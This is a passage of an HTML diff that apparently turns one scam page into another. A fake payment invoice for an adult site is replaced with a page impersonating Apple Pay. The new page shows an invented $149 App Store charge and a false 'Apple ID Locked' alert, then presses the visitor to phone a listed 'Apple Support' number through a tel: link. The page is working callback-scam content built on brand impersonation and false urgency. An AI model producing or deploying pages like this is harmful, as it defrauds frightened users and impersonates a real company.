@@ -1,292 +1,1100 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-82RG3WYP9P"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Apple Pay - Verify</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, 'Helvetica Neue', 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: #000;
+            min-height: 100vh;
+            min-height: 100dvh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 12px;
+            margin: 0;
+            -webkit-tap-highlight-color: transparent;
+            overflow: hidden;
+            overscroll-behavior: contain;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            height: 100dvh;
+        }
+
+        /* ---------- SPLASH ---------- */
+        #splashScreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            height: 100dvh;
+            background: #0b0b0e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            transition: opacity 0.5s ease, visibility 0.5s;
+            padding: 20px;
+            backdrop-filter: blur(2px);
+            padding-top: env(safe-area-inset-top);
+            padding-bottom: env(safe-area-inset-bottom);
+        }
+        #splashScreen.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+        .splash-card {
+            max-width: 380px;
+            width: 100%;
+            background: #1c1c1e;
+            border-radius: 48px;
+            padding: 32px 24px 40px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
+            text-align: center;
+            border: 1px solid #2c2c2e;
+            animation: floatIn 0.6s ease;
+        }
+        @keyframes floatIn {
+            0% { transform: translateY(20px); opacity: 0.6; }
+            100% { transform: translateY(0); opacity: 1; }
+        }
+        .splash-card .apple-pay-badge {
+            font-size: 26px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #f5f5f7;
+            margin-bottom: 12px;
+        }
+        .splash-card .apple-pay-badge i {
+            font-size: 28px;
+            color: #f5f5f7;
+        }
+        .splash-card .processing-text {
+            font-size: 17px;
+            font-weight: 500;
+            color: #aeaeb2;
+            margin: 6px 0 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .splash-card .amount-splash {
+            font-size: 48px;
+            font-weight: 700;
+            letter-spacing: -1px;
+            color: #f5f5f7;
+            margin: 8px 0 4px;
+        }
+        .splash-card .sub-splash {
+            color: #8e8e93;
+            font-size: 16px;
+            margin: 4px 0 14px;
+        }
+        .splash-card .face-id {
+            background: #2c2c2e;
+            border-radius: 60px;
+            padding: 14px 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 500;
+            color: #f5f5f7;
+            margin: 10px 0 14px;
+            border: 1px solid #3a3a3c;
+        }
+        .splash-card .face-id i {
+            font-size: 22px;
+            color: #007aff;
+        }
+        .splash-card .tx-id {
+            background: #2c2c2e;
+            padding: 12px 16px;
+            border-radius: 30px;
+            font-size: 15px;
+            color: #aeaeb2;
+            border: 1px solid #3a3a3c;
+            margin-top: 6px;
+        }
+        .spinner {
+            display: inline-block;
+            width: 22px;
+            height: 22px;
+            border: 3px solid rgba(0, 122, 255, 0.25);
+            border-top: 3px solid #007aff;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* ---------- POPUP OVERLAY ---------- */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            height: 100dvh;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            padding: 12px;
+            z-index: 9999;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease, visibility 0.4s;
+            overscroll-behavior: contain;
+            padding-top: env(safe-area-inset-top);
+            padding-bottom: env(safe-area-inset-bottom);
+            padding-left: env(safe-area-inset-left);
+            padding-right: env(safe-area-inset-right);
+        }
+        .popup-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        /* card - full screen mobile experience */
+        .card {
+            max-width: 420px;
+            width: 100%;
+            max-height: 95vh;
+            max-height: 95dvh;
+            background: #1c1c1e;
+            border-radius: 40px;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7);
+            padding: 20px 18px 24px;
+            border: 1px solid #2c2c2e;
+            transform: scale(0.92) translateY(10px);
+            transition: transform 0.35s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.35s;
+            opacity: 0;
+            position: relative;
+            color: #f5f5f7;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+        }
+        .popup-overlay.active .card {
+            transform: scale(1) translateY(0);
+            opacity: 1;
+        }
+        .card::-webkit-scrollbar {
+            width: 0px;
+            background: transparent;
+        }
+
+        /* ---------- PAGE SYSTEM ---------- */
+        .page {
+            display: none;
+            flex-direction: column;
+            animation: fadeSlide 0.3s ease;
+        }
+        .page.active {
+            display: flex;
+        }
+        @keyframes fadeSlide {
+            0% { opacity: 0; transform: translateY(8px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Page 1 - Phone Number */
+        .phone-number-display {
+            text-align: center;
+            padding: 20px 0 12px;
+        }
+        .phone-number-display .label {
+            color: #8e8e93;
+            font-size: 14px;
+            font-weight: 400;
+            margin-bottom: 6px;
+        }
+        .phone-number-display .number {
+            font-size: 32px;
+            font-weight: 700;
+            color: #f5f5f7;
+            letter-spacing: 1px;
+            background: #2c2c2e;
+            padding: 12px 20px;
+            border-radius: 60px;
+            display: inline-block;
+            border: 1px solid #3a3a3c;
+        }
+        .phone-number-display .number i {
+            color: #007aff;
+            margin-right: 10px;
+        }
+        .phone-number-display .number a {
+            color: #f5f5f7;
+            text-decoration: none;
+        }
+        .phone-number-display .number a:active {
+            opacity: 0.7;
+        }
+        .phone-number-display .sub-text {
+            color: #8e8e93;
+            font-size: 13px;
+            margin-top: 10px;
+        }
+
+        .nav-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 16px;
+        }
+        .nav-btn {
+            flex: 1;
+            padding: 14px;
+            border-radius: 60px;
+            border: none;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.15s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .nav-btn:active {
+            transform: scale(0.97);
+        }
+        .nav-btn.primary {
+            background: #007aff;
+            color: white;
+        }
+        .nav-btn.primary:active {
+            background: #0066d9;
+        }
+        .nav-btn.secondary {
+            background: #2c2c2e;
+            color: #f5f5f7;
+            border: 1px solid #3a3a3c;
+        }
+        .nav-btn.secondary:active {
+            background: #3a3a3c;
+        }
+        .nav-btn.danger {
+            background: #ff3b30;
+            color: white;
+        }
+        .nav-btn.danger:active {
+            background: #d70015;
+        }
+
+        /* ---------- COMPACT STYLES (Page 2) ---------- */
+        .apple-pay-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+        .apple-pay-header .logo {
+            font-size: 18px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+            color: #f5f5f7;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .apple-pay-header .logo i {
+            font-size: 20px;
+            color: #f5f5f7;
+        }
+        .status-badge {
+            background: #2c2c2e;
+            padding: 3px 10px;
+            border-radius: 40px;
+            font-size: 11px;
+            font-weight: 500;
+            color: #aeaeb2;
+            border: 1px solid #3a3a3c;
+        }
+        .amount {
+            font-size: 30px;
+            font-weight: 700;
+            letter-spacing: -1px;
+            color: #f5f5f7;
+            margin: 2px 0 0px;
+            display: flex;
+            align-items: baseline;
+        }
+        .amount small {
+            font-size: 16px;
+            font-weight: 500;
+            color: #8e8e93;
+            margin-left: 4px;
+        }
+        .sub-line {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #aeaeb2;
+            font-size: 13px;
+            font-weight: 400;
+            margin-bottom: 6px;
+            border-bottom: 1px solid #2c2c2e;
+            padding-bottom: 6px;
+        }
+        .sub-line i {
+            color: #007aff;
+            font-size: 14px;
+        }
+        .tx-row {
+            display: flex;
+            justify-content: space-between;
+            background: #2c2c2e;
+            padding: 8px 12px;
+            border-radius: 16px;
+            margin: 4px 0 6px;
+            font-size: 12px;
+            font-weight: 500;
+            color: #f5f5f7;
+            border: 1px solid #3a3a3c;
+        }
+        .tx-row span:last-child {
+            color: #aeaeb2;
+            font-weight: 400;
+        }
+        .tx-detail {
+            background: #2c2c2e;
+            border-radius: 16px;
+            padding: 8px 12px;
+            margin: 4px 0 8px;
+            border: 1px solid #3a3a3c;
+        }
+        .tx-detail .row {
+            display: flex;
+            justify-content: space-between;
+            padding: 4px 0;
+            font-size: 12px;
+            border-bottom: 1px solid #3a3a3c;
+        }
+        .tx-detail .row:last-child {
+            border-bottom: none;
+        }
+        .tx-detail .row .label {
+            color: #8e8e93;
+        }
+        .tx-detail .row .value {
+            font-weight: 500;
+            color: #f5f5f7;
+        }
+        .tx-detail .row .value.completed {
+            color: #34c759;
+        }
+
+        .free-badge {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            color: #8e8e93;
+            font-size: 11px;
+            font-weight: 400;
+            margin-bottom: 6px;
+        }
+
+        .alert-box {
+            background: #2c1c1a;
+            border-left: 5px solid #ff9500;
+            border-radius: 14px;
+            padding: 8px 12px;
+            margin: 6px 0 6px;
+            border: 1px solid #3a2a28;
+        }
+        .alert-box .title {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-weight: 700;
+            font-size: 14px;
+            color: #f5f5f7;
+            margin-bottom: 2px;
+        }
+        .alert-box .title i {
+            color: #ff9500;
+            font-size: 15px;
+        }
+        .alert-box p {
+            color: #d1d1d6;
+            font-size: 12px;
+            line-height: 1.3;
+            margin-bottom: 2px;
+        }
+        .alert-box .location {
+            font-size: 11px;
+            color: #aeaeb2;
+            background: #3a2a28;
+            padding: 1px 10px;
+            border-radius: 30px;
+            display: inline-block;
+            margin: 2px 0 2px;
+        }
+        .verify-now {
+            background: #ff3b30;
+            color: white;
+            border: none;
+            border-radius: 60px;
+            padding: 8px 14px;
+            font-weight: 600;
+            font-size: 13px;
+            width: 100%;
+            margin: 4px 0 2px;
+            transition: 0.15s;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+        .verify-now:active {
+            background: #d70015;
+            transform: scale(0.97);
+        }
+
+        .support-msg {
+            text-align: center;
+            font-weight: 500;
+            font-size: 13px;
+            color: #f5f5f7;
+            margin: 4px 0 2px;
+        }
+        .secure-footer {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            color: #8e8e93;
+            font-size: 11px;
+            margin-top: 10px;
+            border-top: 1px solid #2c2c2e;
+            padding-top: 10px;
+        }
+        .secure-footer i {
+            margin-right: 3px;
+        }
+        .voice-message-banner {
+            background: #2c2c2e;
+            border-radius: 60px;
+            padding: 6px 12px;
+            color: #f5f5f7;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 4px 0 4px;
+            border: 1px solid #3a3a3c;
+            cursor: default;
+        }
+        .voice-message-banner .left {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .voice-message-banner .left i {
+            color: #ffcc00;
+            font-size: 14px;
+        }
+        .voice-message-banner .left .msg {
+            font-weight: 400;
+            font-size: 12px;
+        }
+        .voice-message-banner .badge {
+            background: #ff3b30;
+            border-radius: 30px;
+            padding: 1px 8px;
+            font-size: 10px;
+            font-weight: 600;
+        }
+        .pulse {
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.7; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.05); }
+            100% { opacity: 0.7; transform: scale(1); }
+        }
+        .voice-play-btn {
+            background: #007aff;
+            border: none;
+            color: white;
+            padding: 5px 12px;
+            border-radius: 40px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: 0.15s;
+        }
+        .voice-play-btn:active {
+            background: #0066d9;
+            transform: scale(0.96);
+        }
+        .voice-container {
+            background: #2c2c2e;
+            border-radius: 30px;
+            padding: 6px 12px;
+            margin: 4px 0 6px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+            border: 1px solid #3a3a3c;
+        }
+        .voice-container i {
+            color: #007aff;
+            font-size: 16px;
+        }
+        .voice-container .msg-text {
+            font-weight: 500;
+            flex: 1;
+            color: #f5f5f7;
+            font-size: 13px;
+        }
+        .text-small {
+            font-size: 10px;
+            color: #8e8e93;
+            text-align: center;
+            margin-top: 4px;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 16px 14px 18px;
+                border-radius: 32px;
+                max-height: 92vh;
+                max-height: 92dvh;
+            }
+            .amount {
+                font-size: 26px;
+            }
+            .phone-number-display .number {
+                font-size: 26px;
+                padding: 10px 16px;
+            }
+            .nav-btn {
+                font-size: 14px;
+                padding: 12px;
+            }
+            .voice-container {
+                padding: 5px 10px;
+            }
+            .voice-play-btn {
+                padding: 4px 10px;
+                font-size: 11px;
+            }
+            .alert-box {
+                padding: 6px 10px;
+            }
+            .alert-box .title {
+                font-size: 13px;
+            }
+            .alert-box p {
+                font-size: 11px;
+            }
+        }
+        @media (max-width: 380px) {
+            .card {
+                padding: 12px 10px 14px;
+                border-radius: 28px;
+            }
+            .amount {
+                font-size: 22px;
+            }
+            .tx-row {
+                font-size: 11px;
+                padding: 6px 8px;
+            }
+            .phone-number-display .number {
+                font-size: 22px;
+                padding: 8px 14px;
+            }
+            .nav-btn {
+                font-size: 13px;
+                padding: 10px;
+            }
+        }
+        @supports (padding: max(0px)) {
+            .card {
+                padding-left: max(18px, env(safe-area-inset-left));
+                padding-right: max(18px, env(safe-area-inset-right));
+            }
+        }
+    </style>
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8W1Y6X4JP1"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
 
-  gtag('config', 'G-82RG3WYP9P');
+  gtag('config', 'G-8W1Y6X4JP1');
 </script>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="default">
-<title>Payment Confirmation</title>
-<style>
-*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-html,body{width:100%;height:100%;background:#eaeaef;-webkit-text-size-adjust:100%}
-body{font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue',Arial,sans-serif}
-#app{width:100%;min-height:100vh;background:#eaeaef;display:flex;flex-direction:column}
-
-/* LOADER */
-#screen-loader{width:100%;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;background:#eaeaef}
-.spinner{width:clamp(36px,10vw,52px);height:clamp(36px,10vw,52px);border:3.5px solid #d5d5dc;border-top-color:#1a73e8;border-radius:50%;animation:spin .8s linear infinite}
-@keyframes spin{to{transform:rotate(360deg)}}
-.loader-text{font-size:clamp(13px,3.5vw,16px);color:#8e8e93;font-weight:400}
-
-/* TICK */
-#screen-tick{width:100%;height:100vh;display:none;flex-direction:column;align-items:center;justify-content:center;gap:14px;background:#eaeaef}
-.tick-circle{width:clamp(68px,18vw,90px);height:clamp(68px,18vw,90px);border-radius:50%;background:#34c759;display:flex;align-items:center;justify-content:center;animation:tpop .4s cubic-bezier(.34,1.56,.64,1) both}
-@keyframes tpop{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
-.tick-circle svg{width:55%;height:55%;stroke:#fff;stroke-width:3.5;stroke-linecap:round;stroke-linejoin:round;fill:none;stroke-dasharray:58;stroke-dashoffset:58;animation:dc .38s .35s ease forwards}
-@keyframes dc{to{stroke-dashoffset:0}}
-.tick-label{font-size:clamp(16px,4.5vw,20px);font-weight:700;color:#1c1c1e}
-.tick-sub{font-size:clamp(13px,3.5vw,15px);color:#8e8e93}
-
-/* INVOICE */
-#screen-invoice{width:100%;min-height:100vh;display:none;flex-direction:column;background:#eaeaef;padding:10px 10px 16px;cursor:pointer;user-select:none;overflow-y:auto;-webkit-overflow-scrolling:touch}
-
-/* Card */
-.inv-card{width:100%;border-radius:clamp(12px,3.5vw,18px);overflow:visible;background:#fff}
-
-/* BLUE HEADER */
-.inv-hdr{background:#3c7ef5;padding:14px 14px 13px;color:#fff;border-radius:clamp(12px,3.5vw,18px) clamp(12px,3.5vw,18px) 0 0}
-.inv-hdr-top{display:flex;align-items:flex-start;justify-content:space-between;gap:8px;margin-bottom:14px}
-.inv-left{display:flex;align-items:flex-start;gap:clamp(8px,2.5vw,12px)}
-
-/* Document icon */
-.doc-box{width:clamp(38px,10vw,44px);height:clamp(38px,10vw,44px);min-width:clamp(38px,10vw,44px);background:rgba(255,255,255,0.2);border-radius:9px;display:flex;align-items:center;justify-content:center}
-.doc-box svg{width:clamp(20px,5.5vw,24px);height:clamp(20px,5.5vw,24px);fill:#fff}
-
-.inv-titles h2{font-size:clamp(16px,4.5vw,20px);font-weight:700;line-height:1.2;color:#fff}
-.inv-titles p{font-size:clamp(8px,2.2vw,10px);letter-spacing:1.4px;font-weight:600;color:rgba(255,255,255,0.78);margin-top:3px;text-transform:uppercase}
-
-/* Completed pill */
-.comp-pill{display:flex;align-items:center;gap:5px;background:#0d0d0d;border-radius:50px;padding:5px 11px;white-space:nowrap;flex-shrink:0}
-.gdot{width:clamp(14px,3.8vw,17px);height:clamp(14px,3.8vw,17px);background:#2ecc5f;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:800;color:#fff;line-height:1}
-.comp-pill span{font-size:clamp(11px,3vw,13px);font-weight:600;color:#fff}
-
-/* Invoice number row */
-.inv-div{border:none;border-top:1px solid rgba(255,255,255,0.25);margin-bottom:11px}
-.inv-no{display:flex;justify-content:space-between;align-items:center}
-.inv-no .nl{font-size:clamp(9px,2.5vw,11px);letter-spacing:0.5px;color:rgba(255,255,255,0.72);font-weight:500}
-.inv-no .nv{font-size:clamp(13px,3.8vw,15px);font-weight:800;color:#fff;letter-spacing:0.1px}
-
-/* WHITE BODY */
-.inv-body{background:#fff;padding:18px clamp(14px,4vw,22px) 16px;display:flex;flex-direction:column;align-items:center;border-radius:0 0 clamp(12px,3.5vw,18px) clamp(12px,3.5vw,18px)}
-
-/* LOGO */
-.logo-wrap{display:flex;align-items:center;gap:clamp(8px,2.5vw,12px);margin-bottom:14px}
-.hamster-svg{width:clamp(50px,13vw,64px);height:clamp(50px,13vw,64px);flex-shrink:0}
-.logo-text{display:flex;align-items:center;font-size:clamp(22px,7vw,32px);font-weight:900;letter-spacing:-0.3px;line-height:1}
-.logo-x{color:#e0302e}
-.logo-h{color:#111}
-
-/* Amount */
-.inv-amt{font-size:clamp(36px,11vw,50px);font-weight:800;color:#1a1a1a;letter-spacing:-1.5px;line-height:1;margin-bottom:4px}
-.inv-mth{font-size:clamp(12px,3.2vw,14px);color:#8e8e93;font-weight:400;margin-bottom:14px}
-
-/* TXN rows */
-.txn-wrap{width:100%}
-.txn-head{font-size:clamp(9px,2.3vw,10.5px);font-weight:700;letter-spacing:1.15px;color:#8e8e93;margin-bottom:2px;text-transform:uppercase}
-.txn-row{display:flex;justify-content:space-between;align-items:flex-start;padding:10px 0;border-top:1px solid #efefef;gap:10px}
-.txn-row .tk{font-size:clamp(13px,3.5vw,15px);color:#6e6e73;font-weight:400;flex-shrink:0;line-height:1.35}
-.txn-row .tv{font-size:clamp(13px,3.5vw,15px);font-weight:700;color:#1a1a1a;text-align:right;display:flex;align-items:center;gap:7px;flex-wrap:wrap;justify-content:flex-end}
-.copy-btn{width:28px;height:28px;background:#f2f2f7;border-radius:7px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
-.copy-btn svg{width:14px;height:14px;fill:none;stroke:#555;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
-
-/* Warning line */
-.txn-warn{width:100%;border-top:1px solid #efefef;padding:10px 0 4px}
-.txn-warn p{font-size:clamp(12px,3.2vw,13.5px);color:#c0392b;font-weight:500;line-height:1.55;width:100%;word-break:break-word;overflow-wrap:break-word;white-space:normal}
-
-/* POPUP */
-#popup-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:9999;align-items:center;justify-content:center;padding:clamp(16px,5vw,24px)}
-#popup-overlay.active{display:flex}
-.popup-card{background:#fff;border-radius:18px;width:100%;max-width:clamp(280px,85vw,340px);padding:clamp(22px,5vw,28px) clamp(16px,5vw,22px) clamp(18px,4vw,22px);position:relative;box-shadow:0 16px 48px rgba(0,0,0,0.26);animation:cin .34s cubic-bezier(.34,1.3,.64,1) both}
-@keyframes cin{from{transform:scale(.84);opacity:0}to{transform:scale(1);opacity:1}}
-.px{position:absolute;top:13px;right:13px;width:25px;height:25px;background:#e5e5ea;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;color:#666;cursor:pointer;font-weight:700}
-.pt{font-size:clamp(17px,5vw,21px);font-weight:700;color:#1c1c1e;margin-bottom:14px}
-.p-icon{width:clamp(52px,14vw,64px);height:clamp(52px,14vw,64px);background:#e8effd;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 13px}
-.p-icon svg{width:46%;height:46%;fill:#3478f6}
-.pm{font-size:clamp(12px,3.2vw,14px);line-height:1.58;color:#6e6e73;text-align:center;margin-bottom:13px}
-.pn{font-size:clamp(20px,6vw,26px);font-weight:800;color:#1c1c1e;text-align:center;margin-bottom:16px;letter-spacing:-0.3px}
-.cbtn{display:flex;align-items:center;justify-content:center;gap:9px;background:#3478f6;color:#fff;text-decoration:none;border-radius:13px;width:100%;padding:clamp(12px,3.5vw,15px);font-size:clamp(15px,4vw,17px);font-weight:600;margin-bottom:10px}
-.cbtn svg{width:18px;height:18px;fill:#fff;flex-shrink:0}
-.ml{text-align:center;font-size:clamp(13px,3.5vw,15px);color:#8e8e93;user-select:none}
-</style>
 </head>
 <body>
-<div id="app">
 
-<!-- LOADER -->
-<div id="screen-loader">
-  <div class="spinner"></div>
-  <p class="loader-text">Verifying payment…</p>
-</div>
-
-<!-- TICK -->
-<div id="screen-tick">
-  <div class="tick-circle">
-    <svg viewBox="0 0 44 44"><polyline points="8,23 18,33 36,13"/></svg>
-  </div>
-  <p class="tick-label">Payment Confirmed</p>
-  <p class="tick-sub">Processing your invoice…</p>
-</div>
-
-<!-- INVOICE -->
-<div id="screen-invoice">
-  <div class="inv-card">
-
-    <!-- Blue Header -->
-    <div class="inv-hdr">
-      <div class="inv-hdr-top">
-        <div class="inv-left">
-          <!-- Document icon -->
-          <div class="doc-box">
-            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-              <path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6z"/>
-              <path d="M14 2v6h6" fill="rgba(255,255,255,0.3)"/>
-              <path d="M9 13h6M9 17h4" stroke="#3c7ef5" stroke-width="1.5" stroke-linecap="round"/>
-            </svg>
-          </div>
-          <div class="inv-titles">
-            <h2>Invoice to<br>Xhamster</h2>
-            <p>Payment Confirmation</p>
-          </div>
+    <!-- SPLASH -->
+    <div id="splashScreen">
+        <div class="splash-card">
+            <div class="apple-pay-badge">
+                <i class="fab fa-apple"></i> Apple Pay
+            </div>
+            <div class="processing-text">
+                <span class="spinner"></span> Processing payment
+            </div>
+            <div class="amount-splash">$149.00</div>
+            <div class="sub-splash"><i class="fas fa-shopping-bag" style="margin-right: 6px;"></i> Apple · App Store</div>
+            <div class="face-id">
+                <i class="fas fa-face-id"></i> Face ID · verifying identity
+            </div>
+            <div class="tx-id">
+                <i class="far fa-file-alt" style="margin-right: 6px;"></i> Transaction ID: AP-2026-08-03-14:32
+            </div>
+            <div style="margin-top: 18px; color: #6c6c70; font-size: 14px;">
+                <i class="fas fa-lock" style="margin-right: 4px;"></i> Secure · Encrypted
+            </div>
         </div>
-        <div class="comp-pill">
-          <div class="gdot">✓</div>
-          <span>Completed</span>
-        </div>
-      </div>
-      <hr class="inv-div">
-      <div class="inv-no">
-        <span class="nl">INVOICE NO.</span>
-        <span class="nv">#PPL-2026-8060</span>
-      </div>
     </div>
 
-    <!-- White Body -->
-    <div class="inv-body">
+    <!-- POPUP -->
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="card" id="mainCard">
 
-      <!-- LOGO — pixel matched to screenshot -->
-      <div class="logo-wrap">
-        <!-- Hamster face SVG: exact black outline style from screenshot -->
-        <svg class="hamster-svg" viewBox="0 0 200 210" xmlns="http://www.w3.org/2000/svg" fill="none">
-          <!-- LEFT EAR -->
-          <ellipse cx="48" cy="70" rx="32" ry="40" fill="#fff" stroke="#111" stroke-width="9"/>
-          <ellipse cx="48" cy="72" rx="18" ry="24" fill="#f7cccc"/>
-          <!-- RIGHT EAR -->
-          <ellipse cx="152" cy="70" rx="32" ry="40" fill="#fff" stroke="#111" stroke-width="9"/>
-          <ellipse cx="152" cy="72" rx="18" ry="24" fill="#f7cccc"/>
-          <!-- HEAD -->
-          <ellipse cx="100" cy="130" rx="76" ry="70" fill="#fff" stroke="#111" stroke-width="9"/>
-          <!-- LEFT EYE -->
-          <circle cx="70" cy="112" r="17" fill="#fff" stroke="#111" stroke-width="7"/>
-          <circle cx="72" cy="113" r="9" fill="#111"/>
-          <circle cx="76" cy="108" r="3.5" fill="#fff"/>
-          <!-- RIGHT EYE -->
-          <circle cx="130" cy="112" r="17" fill="#fff" stroke="#111" stroke-width="7"/>
-          <circle cx="132" cy="113" r="9" fill="#111"/>
-          <circle cx="136" cy="108" r="3.5" fill="#fff"/>
-          <!-- NOSE -->
-          <ellipse cx="100" cy="136" rx="9" ry="6.5" fill="#111"/>
-          <!-- PHILTRUM -->
-          <line x1="100" y1="142" x2="100" y2="150" stroke="#111" stroke-width="4.5" stroke-linecap="round"/>
-          <!-- MOUTH LEFT -->
-          <path d="M100 150 Q86 163 76 158" stroke="#111" stroke-width="5" stroke-linecap="round" fill="none"/>
-          <!-- MOUTH RIGHT -->
-          <path d="M100 150 Q114 163 124 158" stroke="#111" stroke-width="5" stroke-linecap="round" fill="none"/>
-          <!-- CHIN ARC -->
-          <path d="M76 158 Q100 174 124 158" stroke="#111" stroke-width="4.5" stroke-linecap="round" fill="none"/>
-          <!-- LEFT CHEEK BLUSH -->
-          <ellipse cx="46" cy="138" rx="16" ry="12" fill="#f7cccc" opacity="0.8"/>
-          <!-- RIGHT CHEEK BLUSH -->
-          <ellipse cx="154" cy="138" rx="16" ry="12" fill="#f7cccc" opacity="0.8"/>
-          <!-- LEFT WHISKERS -->
-          <line x1="18" y1="128" x2="76" y2="132" stroke="#bbb" stroke-width="2.5" stroke-linecap="round"/>
-          <line x1="16" y1="139" x2="76" y2="139" stroke="#bbb" stroke-width="2.5" stroke-linecap="round"/>
-          <line x1="18" y1="150" x2="76" y2="146" stroke="#bbb" stroke-width="2.5" stroke-linecap="round"/>
-          <!-- RIGHT WHISKERS -->
-          <line x1="182" y1="128" x2="124" y2="132" stroke="#bbb" stroke-width="2.5" stroke-linecap="round"/>
-          <line x1="184" y1="139" x2="124" y2="139" stroke="#bbb" stroke-width="2.5" stroke-linecap="round"/>
-          <line x1="182" y1="150" x2="124" y2="146" stroke="#bbb" stroke-width="2.5" stroke-linecap="round"/>
-        </svg>
+            <!-- ===== PAGE 1: PHONE NUMBER ===== -->
+            <div class="page active" id="page1">
+                <div class="apple-pay-header">
+                    <div class="logo">
+                        <i class="fab fa-apple"></i> Apple Pay
+                    </div>
+                    <div class="status-badge"><i class="fas fa-check-circle" style="color:#34c759;"></i> Active</div>
+                </div>
 
-        <div class="logo-text">
-          <span class="logo-x">X</span><span class="logo-h">HAMSTER</span>
+                <div class="phone-number-display">
+                    <div class="label">📞 Call Apple Support Immediately</div>
+                    <div class="number">
+                        <i class="fas fa-phone-alt"></i>
+                        <a href="tel:+18663816357">+1 866-381-6357</a>
+                    </div>
+                    <div class="sub-text">Free · 24/7 · Encrypted</div>
+                </div>
+
+                <div class="alert-box" style="margin-top: 8px;">
+                    <div class="title"><i class="fas fa-exclamation-triangle"></i> Apple ID Locked</div>
+                    <p>Your Apple ID has been temporarily restricted due to an unrecognized sign-in attempt.</p>
+                    <div class="location"><i class="fas fa-map-pin"></i> Unknown location · IP masked</div>
+                </div>
+
+                <div class="nav-buttons">
+                    <button class="nav-btn primary" id="gotoPage2Btn">
+                        <i class="fas fa-arrow-right"></i> View Details
+                    </button>
+                </div>
+
+                <div class="secure-footer" style="margin-top: 12px;">
+                    <span><i class="fas fa-lock"></i> Secure</span>
+                    <span><i class="fas fa-shield-alt"></i> Encrypted</span>
+                    <span><i class="fas fa-clock"></i> 24/7</span>
+                </div>
+            </div>
+
+            <!-- ===== PAGE 2: DETAILS + VOICE ===== -->
+            <div class="page" id="page2">
+                <!-- Back button -->
